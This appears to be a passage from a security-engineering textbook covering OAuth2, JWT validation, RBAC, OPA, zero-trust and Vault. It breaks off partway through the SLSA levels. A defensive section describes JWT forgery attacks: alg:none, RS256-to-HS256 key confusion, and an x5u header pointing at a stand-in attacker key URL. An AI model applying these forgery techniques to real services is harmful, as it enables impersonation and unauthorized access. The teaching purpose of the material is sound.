# Chapter 33 — Security Engineering: Authentication, Authorization, and Zero-Trust at Scale

> **Difficulty:** Advanced | **Importance:** ★★★★★ | **Estimated Reading Time:** 4.5 hours

---

## Prerequisites

- Chapter 4 (TLS, HTTPS, certificate infrastructure)
- Chapter 11 (API Design — HTTP headers, tokens, REST semantics)
- Chapter 15 (Service Mesh — mTLS, sidecar proxies)
- Chapter 31 (API Gateways — JWT validation at edge)

---

## Learning Objectives

By the end of this chapter, you will be able to:

1. Explain the OAuth2 and OIDC flows (Authorization Code + PKCE, Client Credentials, Device Flow) and when each is appropriate
2. Describe the structure of a JWT, its cryptographic guarantees, and the five most critical validation vulnerabilities
3. Design a role-based access control (RBAC) system that scales to thousands of roles without O(n²) permission checks
4. Implement Open Policy Agent (OPA) for distributed, decoupled policy enforcement across microservices
5. Explain the zero-trust network model: why perimeter security fails, what replaces it, and how BeyondCorp implements it
6. Design a secrets management architecture using HashiCorp Vault with dynamic credentials and automatic rotation
7. Analyze the Okta 2023 breach and derive the architectural principles that would have contained the damage
8. Describe supply chain security (SLSA, SBOM, Sigstore) and how it prevents the SolarWinds class of attack

---

## Why This Matters

Security is not a feature you add at the end. It is an architectural property that emerges from every decision you make about identity, trust, data flow, and access control. A payment service with perfect SQL query performance and zero-latency caching is worthless if an attacker can call any endpoint as any user because JWT validation was implemented incorrectly.

The breaches that dominate headlines are rarely "zero-day exploits" or exotic attacks. They are almost always the result of predictable architectural failures:

- Trusting a token without validating its signature algorithm (the `alg:none` JWT attack)
- Storing secrets in environment variables or source code instead of a secrets manager
- Granting overly broad IAM permissions because "we'll tighten it later" (they never do)
- Trusting network location as a proxy for identity (the perimeter security failure)
- Not rotating credentials after a suspected compromise (Okta 2023)

These failures are not inevitable. They are the result of not understanding the security model clearly enough to implement it correctly. This chapter provides that understanding — not as a checklist, but as a mechanistic model of how identity, authorization, and trust work in distributed systems, so you can reason about novel situations rather than just memorizing rules.

---

## Mental Model

***Security in a distributed system is the discipline of answering three questions for every request: Who is making this request (authentication)? Are they allowed to do what they're asking (authorization)? Should I trust the channel this request arrived on (transport security)? Zero-trust extends the third question: Never trust any channel implicitly based on network location. Always verify identity, always enforce authorization, always encrypt in transit — regardless of whether the request comes from the internet or from a peer service on the same internal network.***

---

## Intuition: The Hotel Key Card Analogy

Think of authentication and authorization as a hotel system:

- **Authentication** = checking in at the front desk. The receptionist verifies your identity (passport), confirms your reservation, and gives you a key card. The key card is a **token** — a cryptographically signed artifact that proves your identity.
- **Authorization** = what your key card can access. Room 412 (your room), gym (open to all guests), pool (premium rooms only), executive lounge (loyalty members), kitchen (staff only). The key card encodes these access rights.
- **Zero-trust** = the hotel doesn't trust that anyone inside the building is legitimately there. Even if you're already inside, every door checks your key card — including the elevator, the gym, and the kitchen. Being physically present inside the hotel doesn't grant you blanket access.
- **Secrets rotation** = periodically, the hotel rekeyes all the locks. Old key cards stop working. Guests get new cards. A stolen key card from last month no longer opens anything.

The JWT is the hotel key card. OAuth2 is the check-in process. RBAC/ABAC is the door lock system. Zero-trust is the policy of checking every door every time. Vault/Secrets Manager is the key management system that rekeyes on schedule.

---

## Visual Explanation: OAuth2 Authorization Code Flow

```
Authorization Code + PKCE Flow (Web/Mobile Applications)
─────────────────────────────────────────────────────────

User Browser         Your App (Client)        Auth Server (IdP)     Your API
     │                      │                       │                   │
     │  1. Login button      │                       │                   │
     │─────────────────────>│                       │                   │
     │                      │ 2. Generate:          │                   │
     │                      │   code_verifier       │                   │
     │                      │   code_challenge=     │                   │
     │                      │   SHA256(verifier)    │                   │
     │                      │                       │                   │
     │  3. Redirect to IdP  │                       │                   │
     │<─────────────────────│                       │                   │
     │  GET /authorize?     │                       │                   │
     │    client_id=abc     │                       │                   │
     │    redirect_uri=...  │                       │                   │
     │    code_challenge=.. │                       │                   │
     │    response_type=code│                       │                   │
     │──────────────────────────────────────────────>│                   │
     │                      │                       │                   │
     │  4. Login form       │                       │                   │
     │<──────────────────────────────────────────────│                   │
     │  5. Submit username/password                  │                   │
     │──────────────────────────────────────────────>│                   │
     │                      │                       │                   │
     │  6. Redirect with code│                       │                   │
     │<──────────────────────────────────────────────│                   │
     │  ?code=AUTH_CODE     │                       │                   │
     │  &state=CSRF_TOKEN   │                       │                   │
     │──────────────────────>│                       │                   │
     │                      │ 7. POST /token        │                   │
     │                      │   code=AUTH_CODE      │                   │
     │                      │   code_verifier=...   │                   │
     │                      │   client_id=abc       │                   │
     │                      │──────────────────────>│                   │
     │                      │                       │ Verify:           │
     │                      │                       │ SHA256(verifier)  │
     │                      │                       │ == code_challenge │
     │                      │ 8. Returns tokens     │                   │
     │                      │<──────────────────────│                   │
     │                      │   access_token (JWT)  │                   │
     │                      │   refresh_token       │                   │
     │                      │   id_token (OIDC)     │                   │
     │                      │                       │                   │
     │                      │ 9. API call with JWT  │                   │
     │                      │──────────────────────────────────────────>│
     │                      │                       │ 10. Validate JWT  │
     │                      │                       │     (offline)     │
     │                      │ 11. API response      │                   │
     │                      │<──────────────────────────────────────────│

PKCE (Proof Key for Code Exchange) prevents authorization code interception:
  Without PKCE: attacker intercepts auth code → exchanges for tokens
  With PKCE: code_verifier never leaves the app; attacker has code but not verifier
  → Cannot exchange intercepted code for tokens
```

---

## Core Concepts

### 1. OAuth2 Flows: Choosing the Right One

OAuth2 defines four grant types (flows), each appropriate for different client contexts:

#### Authorization Code + PKCE (Web and Mobile Apps)

```
Use case: User-facing applications where a human logs in.
Client type: Web apps, mobile apps, SPAs (Single-Page Applications)

Key properties:
  - User interacts directly with the Identity Provider (IdP)
  - Client never sees the user's credentials (password stays at IdP)
  - PKCE required for all public clients (no client secret possible in browser/mobile)
  - Returns: access_token (short-lived, 1h), refresh_token (long-lived, 30 days)
  
PKCE algorithm:
  code_verifier = random_base64_url(32)  # 256 bits of entropy
  code_challenge = BASE64URL(SHA256(code_verifier))
  
  At authorization: send code_challenge
  At token exchange: send code_verifier
  IdP verifies: SHA256(code_verifier) == stored code_challenge
```

#### Client Credentials (Service-to-Service)

```
Use case: Machine-to-machine authentication (no user involved).
Client type: Backend services, cron jobs, batch processors

POST /oauth/token
  Content-Type: application/x-www-form-urlencoded
  
  grant_type=client_credentials
  &client_id=service-a-id
  &client_secret=service-a-secret
  &scope=read:products write:inventory

Response:
  {
    "access_token": "eyJhbG...",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "read:products write:inventory"
  }

Key properties:
  - No user context: token represents the SERVICE, not a user
  - client_secret must be stored in secrets manager, not env vars
  - Token cached and reused until expiry (don't re-request per API call)
  - Rotate client_secret in Vault; services auto-fetch new secret on rotation
```

#### Device Authorization Flow (IoT / CLI Tools)

```
Use case: Devices with limited input (TV, CLI tool, IoT sensor)

Device → POST /device/code
Response: {
  "device_code": "GmRhmh...",
  "user_code": "WDJB-MJHT",        ← User enters this code on their phone
  "verification_uri": "https://example.com/device",
  "expires_in": 1800,
  "interval": 5                    ← Poll every 5 seconds
}

User: visits verification_uri on phone, enters "WDJB-MJHT", logs in

Device: polls POST /token with device_code every 5 seconds
  → Gets access_token when user approves

Use cases: GitHub CLI, AWS CLI, Google TV, Kubernetes kubectl with OIDC
```

#### Token Refresh (Maintaining Sessions)

```python
# Access token typically short-lived (15 min - 1 hour)
# Refresh token long-lived (days to weeks)
# Application silently refreshes to maintain session

import time
import httpx

class TokenManager:
    def __init__(self, client_id: str, client_secret: str, token_url: str):
        self.client_id = client_id
        self.client_secret = client_secret
        self.token_url = token_url
        self._access_token = None
        self._refresh_token = None
        self._expires_at = 0
    
    async def get_token(self) -> str:
        """Returns a valid access token, refreshing if necessary."""
        # Check if current token is still valid (with 30s buffer)
        if self._access_token and time.time() < self._expires_at - 30:
            return self._access_token
        
        # Token expired or about to expire: refresh
        if self._refresh_token:
            return await self._refresh()
        
        # No token at all: full authentication
        return await self._authenticate()
    
    async def _refresh(self) -> str:
        async with httpx.AsyncClient() as client:
            response = await client.post(self.token_url, data={
                "grant_type": "refresh_token",
                "refresh_token": self._refresh_token,
                "client_id": self.client_id,
                "client_secret": self.client_secret,
            })
        
        if response.status_code == 400:
            # Refresh token expired or revoked: full re-auth
            self._refresh_token = None
            return await self._authenticate()
        
        response.raise_for_status()
        data = response.json()
        self._store_tokens(data)
        return self._access_token
    
    async def _authenticate(self) -> str:
        async with httpx.AsyncClient() as client:
            response = await client.post(self.token_url, data={
                "grant_type": "client_credentials",
                "client_id": self.client_id,
                "client_secret": self.client_secret,
                "scope": "read:products",
            })
        response.raise_for_status()
        data = response.json()
        self._store_tokens(data)
        return self._access_token
    
    def _store_tokens(self, data: dict):
        self._access_token = data["access_token"]
        self._refresh_token = data.get("refresh_token")
        self._expires_at = time.time() + data["expires_in"]
```

---

### 2. JWT: Structure, Validation, and Vulnerabilities

A JSON Web Token (JWT) consists of three Base64URL-encoded parts separated by dots:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0xIn0
.eyJzdWIiOiJ1c2VyLTEyMyIsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSIsInJvbGVzIjpbInVzZXIiXSwiYXVkIjoiYXBpLmV4YW1wbGUuY29tIiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmV4YW1wbGUuY29tIiwiaWF0IjoxNzA1MzEyMDAwLCJleHAiOjE3MDUzMTU2MDB9
.SIGNATURE

Part 1 — Header (decoded):
{
  "alg": "RS256",          ← Signing algorithm (RSA + SHA256)
  "typ": "JWT",
  "kid": "key-1"           ← Key ID: which public key to verify with
}

Part 2 — Payload (decoded):
{
  "sub": "user-123",       ← Subject: unique user identifier
  "email": "user@example.com",
  "roles": ["user"],
  "aud": "api.example.com",  ← Audience: which service this token is for
  "iss": "https://auth.example.com",  ← Issuer: who created this token
  "iat": 1705312000,       ← Issued At: Unix timestamp
  "exp": 1705315600        ← Expiration: 1 hour after iat
}

Part 3 — Signature:
  RS256: RSA_SIGN(SHA256(base64url(header) + "." + base64url(payload)), private_key)
  Verification: RSA_VERIFY(signature, public_key_identified_by_kid)
```

#### The Five Critical JWT Validation Steps

```python
from jose import jwt, JWTError
from jose.exceptions import ExpiredSignatureError
import httpx
import time

class JWTValidator:
    def __init__(self, jwks_uri: str, audience: str, issuer: str):
        self.jwks_uri = jwks_uri
        self.audience = audience
        self.issuer = issuer
        self._jwks_cache = {}
        self._jwks_fetched_at = 0
    
    async def validate(self, token: str) -> dict:
        """
        Validate JWT and return claims. Raises on any validation failure.
        
        The five critical validation steps:
        1. Algorithm restriction (prevent alg confusion)
        2. Signature verification (prevent forgery)
        3. Expiration check (prevent token replay)
        4. Audience validation (prevent token confused deputy)
        5. Issuer validation (prevent cross-IdP token use)
        """
        
        # Step 0: Decode header WITHOUT verification to get kid and alg
        # WARNING: unverified_header() does NOT verify — never trust its claims
        try:
            header = jwt.get_unverified_header(token)
        except JWTError as e:
            raise AuthError(f"Malformed token header: {e}")
        
        # Step 1: ALGORITHM RESTRICTION
        # NEVER accept: "alg": "none" (no signature = anyone can forge)
        # NEVER accept: any algorithm not in your explicit allowlist
        # NEVER let the token choose the algorithm
        ALLOWED_ALGORITHMS = {"RS256", "ES256"}
        if header.get("alg") not in ALLOWED_ALGORITHMS:
            raise AuthError(
                f"Forbidden algorithm: {header.get('alg')}. "
                f"Only {ALLOWED_ALGORITHMS} are permitted."
            )
        
        # Step 2: FETCH PUBLIC KEY for signature verification
        kid = header.get("kid")
        public_key = await self._get_public_key(kid)
        
        try:
            # Step 2 (cont): SIGNATURE VERIFICATION
            # jose library verifies signature as part of decode()
            # We pass algorithms= explicitly — never let the library infer from token
            claims = jwt.decode(
                token,
                public_key,
                algorithms=list(ALLOWED_ALGORITHMS),  # Explicit allowlist
                
                # Step 3: EXPIRATION — jose checks exp claim automatically
                options={"verify_exp": True},
                
                # Step 4: AUDIENCE — reject if aud != our service identifier
                audience=self.audience,
                
                # Step 5: ISSUER — reject if iss != our trusted identity provider
                issuer=self.issuer,
            )
        except ExpiredSignatureError:
            raise AuthError("Token has expired")
        except JWTError as e:
            raise AuthError(f"Token validation failed: {e}")
        
        return claims
    
    async def _get_public_key(self, kid: str) -> dict:
        """Fetch JWKS and cache. Refresh if kid not found (key rotation)."""
        
        # Try cache first
        if kid in self._jwks_cache:
            return self._jwks_cache[kid]
        
        # Refresh JWKS (max once per 5 minutes to prevent DoS via unknown kids)
        now = time.time()
        if now - self._jwks_fetched_at < 300:  # 5-minute refresh cooldown
            raise AuthError(f"Unknown key ID: {kid}")
        
        async with httpx.AsyncClient() as client:
            response = await client.get(self.jwks_uri, timeout=5.0)
            response.raise_for_status()
            jwks = response.json()
        
        self._jwks_cache = {key["kid"]: key for key in jwks["keys"]}
        self._jwks_fetched_at = now
        
        if kid not in self._jwks_cache:
            raise AuthError(f"Key ID {kid} not found in JWKS")
        
        return self._jwks_cache[kid]


class AuthError(Exception):
    pass
```

#### JWT Attack Vulnerabilities

```
Attack 1: Algorithm Confusion (alg:none)
  Attacker crafts: {"alg": "none"} header + arbitrary payload + no signature
  Vulnerable library: accepts token with no signature if alg=none is allowed
  
  Prevention:
    NEVER include "none" in allowed algorithms list.
    Specify algorithms explicitly in decode() call — never let the token choose.

Attack 2: RS256 → HS256 Confusion
  Background: RS256 uses RSA keypair (private for signing, PUBLIC for verification)
               HS256 uses a SINGLE shared secret for both signing and verification
  
  Attack:
    Attacker obtains your public key (it's public! Available from JWKS endpoint)
    Attacker creates token with {"alg": "HS256"} header
    Attacker signs token with your PUBLIC KEY as the HMAC secret
    Vulnerable library: verifies HS256 signature using... the public key (treats it as HMAC secret)
    Verification PASSES because attacker used the same key as verifier
    
  Prevention:
    Explicitly restrict to {"RS256"} or {"ES256"} — never accept HS256 for public-key issuers.
    Never mix symmetric (HS256) and asymmetric (RS256) verification in the same codebase.

Attack 3: Missing Audience Validation
  Token issued for service-A (aud: "service-a.example.com") is presented to service-B.
  Service-B doesn't validate "aud" claim → accepts token not intended for it.
  Confused Deputy Attack: attacker uses a legitimate token for the wrong service.
  
  Prevention: ALWAYS validate aud claim. Reject tokens not addressed to your service.

Attack 4: Expired Token Replay
  User's token expires. User logs out. Attacker intercepts old token from network traffic.
  Attacker replays expired token to API 30 minutes later.
  
  Prevention:
    Short expiry (15-60 minutes for access tokens).
    Always verify exp claim.
    For sensitive operations: check token revocation list (Redis SET of revoked JTIs).

Attack 5: JWT Injection via Header Fields
  Some libraries trust custom header fields without sanitization:
  {"alg": "RS256", "x5u": "https://attacker.com/evil.pem"}
  x5u is a URL specifying where to fetch the public key from.
  Vulnerable library: fetches attacker's key → validates attacker's signature.
  
  Prevention: Never follow x5u, jku, or x5c header fields for key fetching.
  Only fetch keys from a hardcoded, trusted JWKS URI.
```

---

### 3. Role-Based Access Control (RBAC) at Scale

RBAC is the most widely used authorization model. Users are assigned roles; roles have permissions; permissions define what actions are allowed on what resources.

#### RBAC Data Model

```sql
-- Core RBAC schema
CREATE TABLE roles (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name TEXT UNIQUE NOT NULL,       -- e.g., 'admin', 'editor', 'viewer'
    description TEXT
);

CREATE TABLE permissions (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    resource TEXT NOT NULL,          -- e.g., 'products', 'orders', 'users'
    action TEXT NOT NULL,            -- e.g., 'read', 'create', 'update', 'delete'
    UNIQUE (resource, action)
);

CREATE TABLE role_permissions (
    role_id UUID REFERENCES roles(id) ON DELETE CASCADE,
    permission_id UUID REFERENCES permissions(id) ON DELETE CASCADE,
    PRIMARY KEY (role_id, permission_id)
);

CREATE TABLE user_roles (
    user_id UUID NOT NULL,
    role_id UUID REFERENCES roles(id) ON DELETE CASCADE,
    tenant_id UUID,                  -- For multi-tenant: role scoped to tenant
    granted_at TIMESTAMPTZ DEFAULT NOW(),
    granted_by UUID,
    expires_at TIMESTAMPTZ,          -- Time-limited roles for break-glass access
    PRIMARY KEY (user_id, role_id, COALESCE(tenant_id, '00000000-0000-0000-0000-000000000000'))
);

-- Efficient permission check (used on every API request)
-- This must be fast: indexed and cached
CREATE INDEX idx_user_roles_user ON user_roles (user_id, tenant_id);
CREATE INDEX idx_role_perms_role ON role_permissions (role_id);

-- Function: check if user has permission (used in SQL-level row filtering)
CREATE FUNCTION user_has_permission(
    p_user_id UUID,
    p_tenant_id UUID,
    p_resource TEXT,
    p_action TEXT
) RETURNS BOOLEAN AS $$
    SELECT EXISTS (
        SELECT 1
        FROM user_roles ur
        JOIN role_permissions rp ON rp.role_id = ur.role_id
        JOIN permissions p ON p.id = rp.permission_id
        WHERE ur.user_id = p_user_id
          AND (ur.tenant_id = p_tenant_id OR ur.tenant_id IS NULL)
          AND (ur.expires_at IS NULL OR ur.expires_at > NOW())
          AND p.resource = p_resource
          AND p.action = p_action
    );
$$ LANGUAGE SQL STABLE;
```

#### Caching RBAC Decisions

RBAC checks occur on every API request. A database query on every request is too slow. The solution: cache the user's full permission set in Redis at login time, invalidate on role change.

```python
import json
import redis
from functools import wraps

r = redis.Redis(host='redis', port=6379, db=0)

PERMISSION_CACHE_TTL = 300  # 5 minutes

def get_user_permissions(user_id: str, tenant_id: str) -> set[str]:
    """
    Returns set of permission strings: "resource:action"
    Example: {"products:read", "products:create", "orders:read"}
    """
    cache_key = f"permissions:{tenant_id}:{user_id}"
    
    cached = r.get(cache_key)
    if cached:
        return set(json.loads(cached))
    
    # Fetch from DB (one query for all permissions)
    permissions = db.execute("""
        SELECT DISTINCT p.resource || ':' || p.action AS perm
        FROM user_roles ur
        JOIN role_permissions rp ON rp.role_id = ur.role_id
        JOIN permissions p ON p.id = rp.permission_id
        WHERE ur.user_id = %s
          AND (ur.tenant_id = %s OR ur.tenant_id IS NULL)
          AND (ur.expires_at IS NULL OR ur.expires_at > NOW())
    """, [user_id, tenant_id])
    
    perms = {row['perm'] for row in permissions}
    
    # Cache for 5 minutes. Invalidate explicitly on role change.
    r.setex(cache_key, PERMISSION_CACHE_TTL, json.dumps(list(perms)))
    
    return perms

def require_permission(resource: str, action: str):
    """Decorator for route handlers."""
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            # User identity injected by JWT middleware
            user_id = request.user_id
            tenant_id = request.tenant_id
            
            perms = get_user_permissions(user_id, tenant_id)
            required = f"{resource}:{action}"
            
            if required not in perms:
                return {"error": "forbidden",
                        "required": required}, 403
            
            return f(*args, **kwargs)
        return wrapper
    return decorator

# Usage
@app.route("/api/products", methods=["POST"])
@require_permission("products", "create")
def create_product():
    ...

# Cache invalidation on role change:
def grant_role(user_id: str, tenant_id: str, role_id: str):
    db.execute("INSERT INTO user_roles ...", [user_id, tenant_id, role_id])
    # Invalidate cache immediately so next request reflects new permissions
    r.delete(f"permissions:{tenant_id}:{user_id}")
```

#### Attribute-Based Access Control (ABAC)

RBAC defines permissions on resource types. ABAC adds conditions on resource attributes:

```
RBAC: "Editors can update products" → blanket permission
ABAC: "Editors can update products THEY OWN IN THEIR REGION"

ABAC policy (natural language):
  ALLOW update product IF:
    user.role == 'editor'
    AND product.owner_id == user.id
    AND product.region == user.region
    AND request.time BETWEEN 09:00 AND 18:00 IN user.timezone

ABAC is more expressive but harder to reason about and audit.
Prefer RBAC + application-level ownership checks for most cases.
Use ABAC (via OPA) when permission conditions depend on resource attributes.
```

---

### 4. Open Policy Agent (OPA): Decoupled Policy Enforcement

OPA is a general-purpose policy engine that decouples policy from application code. Instead of embedding authorization logic in every microservice, services ask OPA "is this allowed?" via a local sidecar or API call.

#### Policy as Code (Rego Language)

```rego
# policies/products.rego
package products

import future.keywords.if
import future.keywords.in

# Default: deny everything
default allow = false

# Rule: allow GET (read) for any authenticated user in the tenant
allow if {
    input.method == "GET"
    input.user.tenant_id == input.resource.tenant_id
    "user" in input.user.roles
}

# Rule: allow POST (create) for editors and admins
allow if {
    input.method == "POST"
    input.user.tenant_id == input.resource.tenant_id
    some role in ["editor", "admin"]
    role in input.user.roles
}

# Rule: allow PUT (update) for editors who OWN the resource, or admins
allow if {
    input.method == "PUT"
    input.user.tenant_id == input.resource.tenant_id
    "editor" in input.user.roles
    input.resource.owner_id == input.user.id   # Ownership check
}

allow if {
    input.method in ["PUT", "DELETE"]
    input.user.tenant_id == input.resource.tenant_id
    "admin" in input.user.roles
}

# Rule: rate limit — deny if user has exceeded quota (from external data)
deny if {
    input.user.request_count_this_hour > data.quotas[input.user.plan].requests_per_hour
}
```

#### OPA Integration in Go

```go
package middleware

import (
    "context"
    "encoding/json"
    "net/http"
    
    "github.com/open-policy-agent/opa/rego"
)

type OPAMiddleware struct {
    query rego.PreparedEvalQuery
}

func NewOPAMiddleware(policyPath string) (*OPAMiddleware, error) {
    // Pre-compile the policy (done once at startup)
    query, err := rego.New(
        rego.Query("data.products.allow"),
        rego.Load([]string{policyPath}, nil),
    ).PrepareForEval(context.Background())
    
    if err != nil {
        return nil, err
    }
    return &OPAMiddleware{query: query}, nil
}

func (m *OPAMiddleware) Authorize(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // Build OPA input from request context
        // (user identity was injected by JWT middleware earlier in the chain)
        user := r.Context().Value("user").(UserClaims)
        resource := extractResourceFromPath(r.URL.Path)
        
        input := map[string]interface{}{
            "method": r.Method,
            "path":   r.URL.Path,
            "user": map[string]interface{}{
                "id":        user.ID,
                "tenant_id": user.TenantID,
                "roles":     user.Roles,
            },
            "resource": map[string]interface{}{
                "id":       resource.ID,
                "type":     resource.Type,
                "owner_id": resource.OwnerID,
                "tenant_id": resource.TenantID,
            },
        }
        
        // Evaluate policy (sub-millisecond for compiled query)
        results, err := m.query.Eval(context.Background(), rego.EvalInput(input))
        if err != nil {
            http.Error(w, `{"error":"policy_evaluation_error"}`, 500)
            return
        }
        
        // Check result
        if len(results) == 0 || !results[0].Expressions[0].Value.(bool) {
            w.Header().Set("Content-Type", "application/json")
            http.Error(w, `{"error":"forbidden"}`, http.StatusForbidden)
            return
        }
        
        next.ServeHTTP(w, r)
    })
}
```

**OPA performance characteristics:**
- Compiled (PreparedEvalQuery): <1ms for most policies
- Complex policies with large data sets: 2-10ms
- OPA deployed as sidecar (same pod): <0.5ms network overhead
- OPA deployed as service: 1-3ms network round-trip

---

### 5. Zero-Trust Network Architecture (BeyondCorp Model)

The traditional "perimeter security" model assumes everything inside the corporate network is trusted and everything outside is untrusted. This model fails because:

1. **Lateral movement:** Once an attacker breaches the perimeter (via phishing, VPN vulnerability, insider threat), they have unrestricted internal access
2. **Cloud doesn't have a perimeter:** Microservices in Kubernetes, multi-cloud deployments, remote employees — the "inside" and "outside" distinction is meaningless
3. **Supply chain attacks:** SolarWinds demonstrated that even a trusted internal tool can be a vector if the supplier is compromised

#### Zero-Trust Principles (Google BeyondCorp Model)

```
Traditional Perimeter Model:
  Inside network → Trusted (access everything)
  Outside network → Untrusted (blocked at firewall)
  
  Failure mode: attacker on internal network → full access

Zero-Trust Model:
  EVERY request → Evaluated independently regardless of network location
  Trust is never granted by network location
  Trust is granted by: Identity + Device posture + Context + Policies
  
  Three pillars:
  1. Verify Identity    — who is this? (JWT, mTLS certificates)
  2. Verify Device      — is this device healthy and authorized? (certificate, MDM)
  3. Verify Context     — is this request reasonable? (time, location, behavior)
  
  Result: A request from 10.0.0.1 (internal) is treated the SAME as 
          a request from 203.0.113.45 (external internet)
          Both must prove identity, device compliance, and context
```

#### Implementing Zero-Trust in Microservices

```
Layer 1: Service Identity via mTLS (Chapter 15 detail)
  Every service has a cryptographic certificate (SPIFFE/SPIRE)
  Service A calling Service B must present its certificate
  Service B verifies: this is really Service A (not an attacker on the internal network)
  
  Without mTLS: attacker who compromises one pod → can call ANY other service
  With mTLS: attacker who compromises pod → can only call services that A is ALLOWED to call
  
Layer 2: Authorization at Every Service (not just the edge)
  Each service enforces its own authorization policy
  Even if Service A is trusted (mTLS verified), it can only call
  specific endpoints with specific permissions
  
  Kubernetes NetworkPolicy + Istio AuthorizationPolicy:
  
# Istio AuthorizationPolicy: only products-service can call inventory-service
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: inventory-policy
  namespace: default
spec:
  selector:
    matchLabels:
      app: inventory-service
  rules:
    - from:
        - source:
            principals:
              - "cluster.local/ns/default/sa/products-service"
              # Only the products-service ServiceAccount can call inventory
      to:
        - operation:
            methods: ["GET"]
            paths: ["/api/inventory/*"]
    - from:
        - source:
            principals:
              - "cluster.local/ns/default/sa/admin-service"
      to:
        - operation:
            methods: ["GET", "POST", "PUT", "DELETE"]
            paths: ["/api/inventory/*"]

Layer 3: Request Context Evaluation
  Beyond identity: is this request contextually appropriate?
  - Unusual time (service calling at 3 AM when it normally operates 9-5)
  - Unusual volume (100x normal request rate — data exfiltration?)
  - Unusual target (service suddenly calling a new endpoint it never called before)
  
  Implement: anomaly detection on service call patterns (Chapter 22 observability)
```

---

### 6. Secrets Management with HashiCorp Vault

Secrets are: database passwords, API keys, TLS certificates, encryption keys, OAuth2 client secrets. The core problem: every service needs secrets, but secrets must not be stored in source code, environment variables (leaked via /proc), or plain-text configuration files.

#### The Secret Zero Problem

```
The secret zero problem:
  To retrieve secrets from Vault, a service must authenticate to Vault.
  But how does the service prove its identity to Vault?
  (This is the bootstrapping problem: you need a secret to get a secret)

Solutions:

1. Kubernetes Auth (best for Kubernetes workloads):
   - Every Kubernetes pod has a ServiceAccount JWT automatically mounted
   - Pod presents its ServiceAccount JWT to Vault
   - Vault validates JWT with Kubernetes API server
   - Vault returns short-lived Vault token
   - Pod uses Vault token to fetch secrets
   - No static "secret zero" needed — Kubernetes manages the identity

2. AWS IAM Auth (for AWS):
   - Pod's IAM role (from EC2 instance profile or EKS IAM role for service account)
   - Pod calls Vault /auth/aws/login with signed GetCallerIdentity request
   - Vault validates with AWS STS API
   - Returns Vault token

3. AppRole (for non-cloud environments):
   - role_id: public, baked into container image
   - secret_id: short-lived, injected at deployment time by orchestrator
   - Vault verifies both → returns token
```

#### Dynamic Secrets: Database Credentials

```
Static credentials (wrong):
  services.yaml:
    database:
      password: "MyProductionPassword123"  ← committed to Git, never changes
  
  Problems:
    - Leaked secrets stay valid forever (someone finds it in git history)
    - Breach of one service → all services using same password compromised
    - Rotation requires redeployment of all services

Dynamic credentials (correct):
  1. Service authenticates to Vault (Kubernetes auth)
  2. Vault generates a UNIQUE database username+password for this service instance
  3. Credentials are short-lived (TTL=1h by default)
  4. After TTL: Vault automatically revokes the credentials (DELETE USER in Postgres)
  5. Service renews credentials before TTL expires (Vault agent handles this)
```

```python
# Vault dynamic PostgreSQL credentials
import hvac  # HashiCorp Vault Python client

def get_database_credentials() -> tuple[str, str]:
    """
    Returns (username, password) dynamically generated by Vault.
    Vault creates a temporary PostgreSQL role with the specified permissions.
    """
    client = hvac.Client(url='http://vault:8200')
    
    # Authenticate using Kubernetes service account JWT
    with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
        jwt_token = f.read()
    
    auth_result = client.auth.kubernetes.login(
        role='products-service',       # Vault role that maps to this service
        jwt=jwt_token,
    )
    client.token = auth_result['auth']['client_token']
    
    # Generate dynamic database credentials
    # Vault creates: PostgreSQL role with SELECT/INSERT/UPDATE on products table
    creds = client.secrets.database.generate_credentials(
        name='products-db-role'       # Vault database role configuration
    )
    
    username = creds['data']['username']  # e.g., "v-k8s-products-xY3mK9"
    password = creds['data']['password']  # e.g., "A1b2c3-uniquepassword"
    lease_id = creds['lease_id']
    
    # Store lease_id for renewal
    # Vault agent handles renewal automatically (renew at TTL/2)
    
    return username, password

# Vault configuration (HCL) for the PostgreSQL role:
# vault write database/roles/products-db-role \
#   db_name=products-db \
#   creation_statements="CREATE ROLE '{{name}}' WITH LOGIN PASSWORD '{{password}}' 
#                        VALID UNTIL '{{expiration}}';
#                        GRANT SELECT, INSERT, UPDATE ON products TO '{{name}}';" \
#   default_ttl="1h" \
#   max_ttl="24h"
```

#### Vault PKI: Dynamic TLS Certificates

```bash
# Vault PKI engine: issue short-lived TLS certificates dynamically
# vs: storing long-lived certificates in Kubernetes secrets (rotation nightmare)

# Configure PKI secrets engine (done once by platform team)
vault secrets enable pki
vault secrets tune -max-lease-ttl=8760h pki  # 1 year max

# Generate CA
vault write pki/root/generate/internal \
    common_name="example.com" \
    ttl=8760h

# Create a role for issuing service certificates
vault write pki/roles/service-cert \
    allowed_domains="svc.cluster.local" \
    allow_subdomains=true \
    max_ttl="24h"    # Short-lived: 24 hours

# Service requests its own certificate at startup
# Vault agent (sidecar) handles this automatically and renews at TTL/2
# /vault/secrets/tls.crt and /vault/secrets/tls.key written to pod filesystem

# Benefits:
# - 24h TTL: compromised cert expires quickly (vs 1-year cert that must be revoked)
# - Automatic renewal: no manual cert rotation needed
# - Per-service identity: each service has its own cert (not a shared wildcard)
# - Revocation: Vault can instantly revoke any certificate
```

---

### 7. Supply Chain Security: SLSA, SBOM, and Sigstore

The SolarWinds attack (2020) demonstrated that the software build pipeline is a high-value attack target. An attacker who compromises the build process can insert malicious code into software that all downstream users trust.

#### SLSA Framework (Supply chain Levels for Software Artifacts)

```
SLSA (pronounced "salsa") defines four levels of supply chain security:

Level 1: Provenance — Build produces a provenance document
  What: Record of WHAT was built, FROM WHAT source, BY WHAT build process
  How: Build system generates signed attestation: 
       {source_commit: "abc123", builder: "GitHub Actions", 
        build_config: "release.yml", outputs: [{hash: "sha256:..."}]}

Level 2: Hosted — Provenance generated by a hosted build service
  What: Build environment controlled by a service you didn't build
  How: GitHub Actions, Google Cloud Build, etc. (not a laptop)
  Why: Prevents "I built it locally and it's fine" → single developer compromise

Level 3: Hardened — Build environment ephemeral and isolated
  What: Fresh build environment per build, no persistent state
  How: Each CI run: fresh container, no cached layers that could be poisoned
